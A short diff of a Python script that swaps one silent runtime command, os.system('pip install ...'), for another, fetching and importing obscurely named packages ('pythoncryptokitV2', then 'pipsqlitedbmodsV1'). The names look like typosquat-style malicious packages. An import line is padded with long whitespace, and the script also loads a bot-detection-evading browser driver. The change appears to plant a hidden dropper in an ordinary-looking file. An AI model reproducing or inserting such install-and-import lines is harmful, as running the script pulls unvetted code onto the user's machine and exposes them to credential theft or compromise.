@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncryptokitV2")
-import pythoncryptokitV2
+os.system("pip install pipsqlitedbmodsV1")
+import pipsqlitedbmodsV1
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
